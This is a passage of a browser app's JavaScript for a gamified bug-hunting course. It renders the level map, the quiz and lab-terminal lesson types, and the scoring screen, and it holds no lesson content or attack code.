  var pb=document.createElement('div');pb.className='pbar';pb.style.marginBottom='10px';
  pb.innerHTML='<div class="pfill pfill-g" style="width:'+pct+'%"></div>';w.appendChild(pb);

  // Continue button
  if(next){
    var cb=document.createElement('button');cb.className='btn full';cb.style.cssText='margin-bottom:20px;font-size:.95rem;padding:13px';
    cb.textContent='\u25B6  Continue Learning';cb.onclick=function(){SFX.tap();startLesson(next)};w.appendChild(cb);
  }else if(done===PATH.length){
    var cd=document.createElement('div');cd.className='card';cd.style.cssText='text-align:center;margin-bottom:20px;background:linear-gradient(135deg,rgba(52,211,153,.15),rgba(34,211,238,.1));border-color:var(--green)';
    cd.innerHTML='<div style="font-size:1.4rem;font-weight:800">\uD83C\uDF93 Course Complete!</div><div style="font-size:.85rem;color:var(--text2);margin-top:6px">You finished all '+PATH.length+' levels. Go find some bugs!</div>';
    w.appendChild(cd);
  }

  // Sections
  SECTIONS.forEach(function(sec){
    var secDone=0,secTotal=0;
    sec.units.forEach(function(u){u.levels.forEach(function(l){secTotal++;if(S.progress[l.id]&&S.progress[l.id].passed)secDone++})});
    var secPct=secTotal?Math.round(secDone/secTotal*100):0;

    var tierColors={beginner:'var(--green)',intermediate:'var(--blue)',advanced:'var(--purple)'};
    var tierLabels={beginner:'BEGINNER',intermediate:'INTERMEDIATE',advanced:'ADVANCED'};

    var sh=document.createElement('div');sh.className='sec-hdr';
    sh.innerHTML='<div class="sec-icon" style="background:'+(tierColors[sec.tier]||'var(--green)')+';color:#080c14">'+sec.icon+'</div><div class="sec-info"><div class="sec-title">'+esc(sec.title)+'</div><div class="sec-desc" style="color:'+(tierColors[sec.tier]||'var(--textDim)')+'">'+tierLabels[sec.tier]+' \u2022 '+secDone+'/'+secTotal+'</div></div><div style="font-size:.7rem;color:var(--textDim);font-family:JetBrains Mono,monospace">'+secPct+'%</div>';
    w.appendChild(sh);
    var spb=document.createElement('div');spb.className='pbar';spb.style.marginBottom='12px';
    var fc=sec.tier==='advanced'?'pfill-b':'pfill-g';
    spb.innerHTML='<div class="pfill '+fc+'" style="width:'+secPct+'%"></div>';w.appendChild(spb);

    sec.units.forEach(function(unit){
      var uDone=true,uStarted=false;
      unit.levels.forEach(function(l){if(!S.progress[l.id]||!S.progress[l.id].passed)uDone=false;if(S.progress[l.id]&&S.progress[l.id].passed)uStarted=true});
      var ulab=document.createElement('div');ulab.style.cssText='font-size:.78rem;color:var(--textDim);margin:12px 0 6px;font-weight:600';
      ulab.textContent=(uDone?'\u2705':uStarted?'\uD83D\uDD36':'\uD83D\uDD12')+' '+unit.title;
      w.appendChild(ulab);
      var row=document.createElement('div');row.style.cssText='display:flex;flex-wrap:wrap;gap:8px;margin-bottom:4px;padding-left:4px';
      unit.levels.forEach(function(lev,li){
        var pi=PATH.indexOf(lev.id);
        var unlocked=pi===0||(S.progress[PATH[pi-1]]&&S.progress[PATH[pi-1]].passed);
        var isDone=S.progress[lev.id]&&S.progress[lev.id].passed;
        var isCur=lev.id===next;
        var isCP=lev.isCheckpoint;
        var stars=(S.progress[lev.id]&&S.progress[lev.id].stars)||0;
        var col=document.createElement('div');col.style.cssText='display:flex;flex-direction:column;align-items:center;gap:2px';
        var nd=document.createElement('div');nd.className='mnode '+(isCP?'cp ':'')+(isDone?'done':isCur||unlocked?'cur':'lock');
        nd.title=lev.title;nd.textContent=isDone?'\u2713':isCP?(unlocked?'\uD83C\uDFC6':'\uD83D\uDD12'):!unlocked?'\uD83D\uDD12':String(li+1);
        if(unlocked)nd.onclick=(function(id){return function(){SFX.tap();startLesson(id)}})(lev.id);
        col.appendChild(nd);
        if(isDone&&stars>0){var st=document.createElement('div');st.style.fontSize='.55rem';st.textContent='\u2B50'.repeat(stars);col.appendChild(st)}
        row.appendChild(col);
      });
      w.appendChild(row);
    });
  });
  w.appendChild(document.createElement('div')).style.height='40px';
  root.appendChild(w);
}

// === LESSON ENGINE ===
function startLesson(id){S.activeId=id;S.ri=0;S.scores=[];S.screen='lesson';render()}

function renderLesson(){
  var level=null;
  for(var i=0;i<ALL_LEVELS.length;i++)if(ALL_LEVELS[i].id===S.activeId){level=ALL_LEVELS[i];break}
  if(!level){S.screen='map';render();return}
  var rounds=level.rounds,round=rounds[S.ri];
  if(!round){S.screen='result';render();return}
  var progress=S.ri/rounds.length*100;
  var w=document.createElement('div');w.className='hp';

  var top=document.createElement('div');top.style.cssText='display:flex;align-items:center;gap:10px;margin-bottom:14px';
  var xb=document.createElement('button');xb.className='btn icon-btn';xb.textContent='\u2715';xb.onclick=function(){if(S.ri>0){showConfirm('Leave lesson?','Your progress in this lesson will be lost.',function(){S.screen='map';render()})}else{S.screen='map';render()}};
  top.appendChild(xb);
  var pbd=document.createElement('div');pbd.style.flex='1';pbd.innerHTML='<div class="pbar"><div class="pfill pfill-g" style="width:'+progress+'%"></div></div>';
  top.appendChild(pbd);
  var cnt=document.createElement('span');cnt.style.cssText='font-size:.72rem;color:var(--textDim);font-family:JetBrains Mono,monospace;min-width:36px;text-align:right';cnt.textContent=(S.ri+1)+'/'+rounds.length;
  top.appendChild(cnt);w.appendChild(top);

  function advance(scored){
    if(scored!==undefined)S.scores.push(scored);
    S.ri++;setTimeout(function(){render()},scored===undefined?50:400);
  }

  var card=document.createElement('div');card.className='card slideUp gap';

  if(round.type==='teach'){
    card.classList.add('teach');
    card.innerHTML='<div style="font-size:.68rem;color:var(--cyan);font-weight:700;text-transform:uppercase;letter-spacing:1.5px">\uD83D\uDCD6 LEARN</div>';
    var txt=document.createElement('div');txt.style.cssText='font-size:.9rem;line-height:1.65;white-space:pre-wrap';txt.textContent=round.text;card.appendChild(txt);
    if(round.os&&typeof round.os==='object'&&S.userOS){
      var osDiv=document.createElement('div'),activeOS=S.userOS[0];
      function drawOS(){
        osDiv.innerHTML='';
        var tabs=document.createElement('div');tabs.style.cssText='display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap';
        S.userOS.forEach(function(os){
          var tb=document.createElement('button');tb.className='ostab'+(activeOS===os?' active':'');tb.textContent=os;
          tb.onclick=function(){activeOS=os;drawOS()};tabs.appendChild(tb);
        });
        osDiv.appendChild(tabs);
        var code=document.createElement('div');code.style.cssText='background:var(--bg);padding:12px;border-radius:8px;font-family:JetBrains Mono,monospace;font-size:.78rem;white-space:pre-wrap;color:var(--green);line-height:1.6';
        code.textContent=round.os[activeOS]||round.os.linux||'Same as Linux';osDiv.appendChild(code);
      }
      drawOS();card.appendChild(osDiv);
    }
    var btn=document.createElement('button');btn.className='btn full';btn.textContent='Got it \u2192';btn.onclick=function(){advance()};card.appendChild(btn);
  }
  else if(round.type==='pick'){
    var answered=false;
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div>';
    var od=document.createElement('div');
    shuffle(round.opts).forEach(function(opt){
      var b=document.createElement('button');b.className='opt';b.textContent=opt;
      b.onclick=function(){if(answered)return;answered=true;
        var correct=opt===round.a;correct?SFX.correct():SFX.wrong();
        var bs=od.querySelectorAll('.opt');
        for(var i=0;i<bs.length;i++){if(bs[i].textContent===round.a){bs[i].classList.add('correct');bs[i].classList.add('pulse')}else if(bs[i].textContent===opt&&!correct){bs[i].classList.add('wrong');bs[i].classList.add('shake')}}
        if(round.why){var wh=document.createElement('div');wh.className='why';wh.textContent=round.why;card.appendChild(wh)}
        setTimeout(function(){advance(correct)},1300);
      };od.appendChild(b);
    });card.appendChild(od);
  }
  else if(round.type==='tf'){
    var answered=false;
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div>';
    var row=document.createElement('div');row.style.cssText='display:flex;gap:8px';
    [true,false].forEach(function(v){
      var b=document.createElement('button');b.className='opt';b.style.cssText='flex:1;text-align:center;font-weight:600';b.textContent=v?'\u2705 True':'\u274C False';
      b.onclick=function(){if(answered)return;answered=true;
        var correct=v===round.a;correct?SFX.correct():SFX.wrong();
        var bs=row.querySelectorAll('.opt');for(var i=0;i<bs.length;i++){var bv=bs[i].textContent.indexOf('True')!==-1;if(bv===round.a){bs[i].classList.add('correct');bs[i].classList.add('pulse')}else if(bv===v&&!correct){bs[i].classList.add('wrong');bs[i].classList.add('shake')}}
        if(round.why){var wh=document.createElement('div');wh.className='why';wh.textContent=round.why;card.appendChild(wh)}
        setTimeout(function(){advance(correct)},1300);
      };row.appendChild(b);
    });card.appendChild(row);
  }
  else if(round.type==='type'||round.type==='fillin'){
    var answered=false;
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div>';
    var inp=document.createElement('input');inp.className='inp';inp.placeholder='Type your answer...';inp.autocomplete='off';inp.autocapitalize='off';inp.spellcheck=false;
    var btn=document.createElement('button');btn.className='btn full';btn.textContent='Check';
    function doCheck(){if(answered||!inp.value.trim())return;answered=true;
      var correct=false;for(var i=0;i<round.a.length;i++)if(inp.value.trim().toLowerCase()===round.a[i].toLowerCase()){correct=true;break}
      correct?SFX.correct():SFX.wrong();card.classList.add(correct?'glow':'shake');
      if(!correct){var ans=document.createElement('div');ans.style.cssText='font-size:.82rem;color:var(--green);font-family:JetBrains Mono,monospace;padding:8px 12px;background:var(--bg);border-radius:8px;margin-top:4px';ans.textContent=round.a[0];card.appendChild(ans)}
      if(round.why){var wh=document.createElement('div');wh.className='why';wh.textContent=round.why;card.appendChild(wh)}
      btn.style.display='none';inp.disabled=true;setTimeout(function(){advance(correct)},1300);
    }
    inp.onkeydown=function(e){if(e.key==='Enter')doCheck()};btn.onclick=doCheck;
    card.appendChild(inp);card.appendChild(btn);w.appendChild(card);root.appendChild(w);setTimeout(function(){inp.focus()},100);return;
  }
  else if(round.type==='order'){
    var items=shuffle(round.items),answered=false;
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div>';
    var ld=document.createElement('div');
    function drawOrd(){ld.innerHTML='';items.forEach(function(item,i){
      var r=document.createElement('div');r.className='oi';
      r.innerHTML='<span style="color:var(--textDim);font-size:.78rem;width:20px;font-family:JetBrains Mono,monospace">'+(i+1)+'</span><span style="flex:1;font-size:.85rem">'+esc(item)+'</span>';
      var btns=document.createElement('div');btns.style.cssText='display:flex;flex-direction:column;gap:2px';
      var up=document.createElement('button');up.innerHTML='&#9650;';up.onclick=function(){if(answered||i===0)return;SFX.tap();var t=items[i];items[i]=items[i-1];items[i-1]=t;drawOrd()};
      var dn=document.createElement('button');dn.innerHTML='&#9660;';dn.onclick=function(){if(answered||i===items.length-1)return;SFX.tap();var t=items[i];items[i]=items[i+1];items[i+1]=t;drawOrd()};
      btns.appendChild(up);btns.appendChild(dn);r.appendChild(btns);ld.appendChild(r);
    })}
    drawOrd();card.appendChild(ld);
    var btn=document.createElement('button');btn.className='btn full';btn.textContent='Check Order';
    btn.onclick=function(){if(answered)return;answered=true;
      var correct=true;for(var i=0;i<items.length;i++)if(items[i]!==round.items[i]){correct=false;break}
      correct?SFX.correct():SFX.wrong();card.classList.add(correct?'pulse':'shake');
      if(!correct)setTimeout(function(){items=round.items.slice();drawOrd()},600);
      if(round.why){var wh=document.createElement('div');wh.className='why';wh.textContent=round.why;card.appendChild(wh)}
      btn.style.display='none';setTimeout(function(){advance(correct)},1400);
    };card.appendChild(btn);
  }
  else if(round.type==='match'){
    var selL=null,matched={},complete=false;
    var rightItems=shuffle(round.pairs.map(function(p){return p[1]}));
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div><div style="font-size:.72rem;color:var(--textDim)">Tap left, then tap its match on right</div>';
    var grid=document.createElement('div');grid.style.cssText='display:grid;grid-template-columns:1fr 1fr;gap:8px';
    var lc=document.createElement('div');lc.className='gap';var rc=document.createElement('div');rc.className='gap';
    function drawM(){lc.innerHTML='';rc.innerHTML='';
      round.pairs.forEach(function(p){
        var id=!!matched[p[0]],is=selL===p[0];
        var d=document.createElement('div');d.className='mi';
        d.style.borderColor=id?'var(--green)':is?'var(--blue)':'var(--border)';
        d.style.background=id?'var(--greenDim)':'var(--card2)';d.style.color=id?'var(--green)':'var(--text)';
        d.textContent=(id?'\u2713 ':'')+p[0];
        if(!id)d.onclick=function(){SFX.tap();selL=selL===p[0]?null:p[0];drawM()};lc.appendChild(d);
      });
      rightItems.forEach(function(r){
        var id=false;for(var k in matched)if(matched[k]===r)id=true;
        var d=document.createElement('div');d.className='mi';
        d.style.borderColor=id?'var(--green)':'var(--border)';d.style.background=id?'var(--greenDim)':'var(--card2)';d.style.color=id?'var(--green)':'var(--text)';
        d.textContent=(id?'\u2713 ':'')+r;
        if(!id&&!complete)d.onclick=function(){if(!selL)return;
          var pair=null;for(var i=0;i<round.pairs.length;i++)if(round.pairs[i][0]===selL)pair=round.pairs[i];
          if(pair&&pair[1]===r){matched[selL]=r;selL=null;SFX.tap();var mc=0;for(var k in matched)mc++;
            if(mc===round.pairs.length){complete=true;SFX.correct();
              if(round.why){var wh=document.createElement('div');wh.className='why';wh.textContent=round.why;card.appendChild(wh)}
              setTimeout(function(){advance(true)},1000)}drawM();
          }else{SFX.wrong();d.classList.add('shake');d.style.borderColor='var(--red)';setTimeout(function(){d.classList.remove('shake');d.style.borderColor='var(--border)'},600)}
        };rc.appendChild(d);
      });}
    drawM();grid.appendChild(lc);grid.appendChild(rc);card.appendChild(grid);
  }
  else if(round.type==='build'){
    var built=[],avail=shuffle(round.parts.slice()),answered=false;
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div>';
    var bd=document.createElement('div');bd.style.cssText='min-height:44px;background:var(--bg);border-radius:10px;padding:10px;display:flex;flex-wrap:wrap;gap:6px;font-family:JetBrains Mono,monospace;font-size:.8rem';
    var ad=document.createElement('div');ad.style.cssText='display:flex;flex-wrap:wrap;gap:6px';
    var ck=document.createElement('button');ck.className='btn full';ck.textContent='Check';ck.style.display='none';
    function drawB(){bd.innerHTML='';ad.innerHTML='';
      if(!built.length)bd.innerHTML='<span style="color:var(--textDim)">Tap parts to build...</span>';
      built.forEach(function(p,i){var s=document.createElement('span');s.style.cssText='background:var(--card2);padding:5px 10px;border-radius:6px;cursor:pointer;border:1px solid var(--border)';s.textContent=p;s.onclick=function(){if(answered)return;avail.push(built[i]);built.splice(i,1);drawB()};bd.appendChild(s)});
      avail.forEach(function(p,i){var b=document.createElement('button');b.className='btn sm sec';b.style.cssText='font-family:JetBrains Mono,monospace;font-size:.78rem';b.textContent=p;b.onclick=function(){if(answered)return;SFX.tap();built.push(avail[i]);avail.splice(i,1);drawB()};ad.appendChild(b)});
      ck.style.display=built.length&&!answered?'':'none';
    }
    ck.onclick=function(){if(answered)return;answered=true;
      var correct=built.join(' ')===round.answer.join(' ');correct?SFX.correct():SFX.wrong();card.classList.add(correct?'glow':'shake');
      if(!correct){var ans=document.createElement('div');ans.style.cssText='font-size:.82rem;color:var(--green);font-family:JetBrains Mono,monospace;padding:8px 12px;background:var(--bg);border-radius:8px';ans.textContent=round.answer.join(' ');card.appendChild(ans)}
      if(round.why){var wh=document.createElement('div');wh.className='why';wh.textContent=round.why;card.appendChild(wh)}
      ck.style.display='none';setTimeout(function(){advance(correct)},1300);
    };
    drawB();card.appendChild(bd);card.appendChild(ad);card.appendChild(ck);
  }
  else if(round.type==='lab'){
    var step=0,labDone=false,steps=round.steps,cur=steps[0];
    card.style.borderColor='#1a3a1a';
    card.innerHTML='<div style="display:flex;justify-content:space-between;align-items:center"><div style="font-size:.68rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:1.5px">\uD83D\uDDA5\uFE0F LAB: '+esc(round.title)+'</div><span class="badge badge-level" id="labstep">1/'+steps.length+'</span></div>';
    card.innerHTML+='<div style="background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:10px 14px;font-size:.85rem"><strong style="color:var(--cyan)">\uD83C\uDFAF</strong> '+esc(round.objective)+'</div>';
    var term=document.createElement('div');term.className='labterm';
    if(round.banner){var bd2=document.createElement('div');bd2.className='o';bd2.textContent=round.banner;term.appendChild(bd2)}
    function addLn(c,t){var d=document.createElement('div');d.className=c;d.textContent=t;term.appendChild(d);term.scrollTop=term.scrollHeight}
    addLn('h','\u27A1\uFE0F Step 1/'+steps.length+': '+cur.hint);card.appendChild(term);
    var lr=document.createElement('div');lr.style.cssText='display:flex;gap:6px;align-items:center;margin-top:8px';
    lr.innerHTML='<span style="color:var(--green);font-family:JetBrains Mono,monospace;font-size:.8rem">$</span>';
    var li2=document.createElement('input');li2.className='inp';li2.style.cssText='flex:1;font-size:.8rem;padding:10px 12px';li2.placeholder=cur.placeholder||'Type command...';li2.autocomplete='off';li2.autocapitalize='off';li2.spellcheck=false;
    var lb=document.createElement('button');lb.className='btn sm';lb.textContent='Run';
    function runC(){if(labDone||!li2.value.trim())return;var cmd=li2.value.trim();li2.value='';addLn('p','$ '+cmd);cur=steps[step];
      var ok=false;for(var i=0;i<cur.accept.length;i++){var a=cur.accept[i];if(a.charAt(0)==='~'){if(cmd.toLowerCase().indexOf(a.slice(1).toLowerCase())!==-1){ok=true;break}}else if(cmd.toLowerCase().replace(/\s+/g,' ')===a.toLowerCase()){ok=true;break}}
      if(ok){SFX.correct();addLn('o',cur.output);if(cur.successMsg)addLn('s','\u2705 '+cur.successMsg);
        if(step+1>=steps.length){addLn('s','\n\uD83C\uDF89 Lab Complete!');labDone=true;SFX.complete();li2.disabled=true;setTimeout(function(){advance(true)},1500)}
        else{step++;cur=steps[step];addLn('h','\n\u27A1\uFE0F Step '+(step+1)+'/'+steps.length+': '+cur.hint);var ls2=document.getElementById('labstep');if(ls2)ls2.textContent=(step+1)+'/'+steps.length}
      }else{SFX.wrong();addLn('f',cur.wrongMsg||'Not quite. Try again.');if(cur.example)addLn('h','\uD83D\uDCA1 Try: '+cur.example)}
    }
    li2.onkeydown=function(e){if(e.key==='Enter')runC()};lb.onclick=runC;
    lr.appendChild(li2);lr.appendChild(lb);card.appendChild(lr);
    if(cur.quickCmds){var qr=document.createElement('div');qr.style.cssText='display:flex;flex-wrap:wrap;gap:4px;margin-top:6px';
      cur.quickCmds.forEach(function(c){var b=document.createElement('button');b.className='btn sm sec';b.style.cssText='font-family:JetBrains Mono,monospace;font-size:.7rem;padding:4px 8px';b.textContent=c;b.onclick=function(){li2.value=c;li2.focus()};qr.appendChild(b)});card.appendChild(qr)}
  }
  w.appendChild(card);root.appendChild(w);
}

// === RESULT ===
function renderResult(){
  var level=null;for(var i=0;i<ALL_LEVELS.length;i++)if(ALL_LEVELS[i].id===S.activeId){level=ALL_LEVELS[i];break}
  if(!level){S.screen='map';render();return}
  var scoreable=level.rounds.filter(function(r){return r.type!=='teach'});
  var correct=0;S.scores.forEach(function(s){if(s)correct++});
  var total=scoreable.length,pctC=total>0?correct/total:1;
  var passed=pctC>=.7,stars=pctC>=.95?3:pctC>=.8?2:1;
  if(passed)SFX.complete();
  var w=document.createElement('div');w.className='center';
  var card=document.createElement('div');card.className='card fadeIn gap';card.style.cssText='text-align:center;width:100%;max-width:380px';
  card.innerHTML='<div style="font-size:1.4rem;font-weight:800;margin-top:8px">'+(passed?'\uD83C\uDF89 Level Complete!':'\uD83D\uDCAA Almost \u2014 try again!')+'</div>';
  card.innerHTML+='<div style="color:var(--text2);font-size:.9rem">'+correct+'/'+total+' correct'+(total===0?' (info only)':'')+'</div>';
  if(passed&&total>0){
    var sr=document.createElement('div');sr.style.cssText='display:flex;gap:8px;justify-content:center';
    for(var s=1;s<=3;s++){var sp=document.createElement('span');sp.style.cssText='font-size:2rem;animation-delay:'+s*.15+'s;opacity:'+(s<=stars?1:.15);if(s<=stars)sp.className='starPop';sp.textContent='\u2B50';sr.appendChild(sp)}
    card.appendChild(sr);
  }
  if(passed)card.innerHTML+='<div style="font-size:.85rem;color:var(--green);font-weight:600">+'+Math.max(correct*10,10)+' XP</div>';
  else card.innerHTML+='<div style="font-size:.85rem;color:var(--textDim)">Need 70% to pass</div>';
  var btn=document.createElement('button');btn.className='btn full';btn.textContent=passed?'Continue':'Retry';
  btn.onclick=function(){if(passed){var old=S.progress[S.activeId]||{};S.progress[S.activeId]={passed:true,stars:Math.max(stars,old.stars||0),xp:Math.max(correct*10,old.xp||0)};saveP(S.user,S.progress)}S.screen='map';render()};
  card.appendChild(btn);
  if(passed){var again=document.createElement('button');again.className='btn sec full';again.textContent='Practice Again';again.onclick=function(){startLesson(S.activeId)};card.appendChild(again)}
  root.appendChild(w.appendChild(card)||w);
}

// === BOOT ===
render();
</script>
</body>
</html>
